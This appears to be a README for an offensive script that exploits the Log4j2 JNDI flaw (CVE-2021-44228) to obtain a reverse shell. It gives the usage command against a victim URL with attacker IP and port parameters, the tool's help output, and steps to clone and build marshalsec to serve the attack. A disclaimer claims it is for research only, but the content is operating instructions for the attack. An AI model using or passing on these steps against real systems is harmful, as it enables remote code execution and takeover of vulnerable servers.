# Log4j2-CVE-2021-44228-revshell

## Tested on
    
    - Ubuntu 18.04
    
## Usage

    $~ python3 Log4j2-revshell.py -u http://www.victimLog4j.xyz:8080 -l [AttackerIP] -p [AttackerPort] -hp [HTTPServerPort]

        usage: Log4j2-revshell.py [-h] -u TARGET -l LHOST -p LPORT -hp HTTPPORT

        Log4j2 Reverse Shell

        optional arguments:
          -h, --help            show this help message and exit
          -u TARGET, --target TARGET
                                Target URL, http://www.victimLog4j.xyz:8080
          -l LHOST, --lhost LHOST
                                Attacker IP for receive revshell
          -p LPORT, --lport LPORT
                                Attacker port for receive revshell
          -hp HTTPPORT, --httpport HTTPPORT
                                HTTP server port on attacker host
## Requirement
    
    1. git clone https://github.com/mbechler/marshalsec
    2. Java 8 # you can get Java 8 here https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html, suggested to install jdk-8u181-linux-x64.tar.gz [Java 1.8.0_181]
    3. 

## Guided step

    $~  git clone https://github.com/mbechler/marshalsec /tmp/Log4j2-dir; cd /tmp/Log4j2-dir #Install marshalsec
    $~  sudo apt install maven #Build marshalsec with the Java builder maven. If you do not have maven, please install first
    $~  mvn clean package -DskipTests #Build marshalsec tool with maven 
    
## Disclaimer:

    The script is for security analysis and research only, hence I would not be liable if it is been used for illicit activities
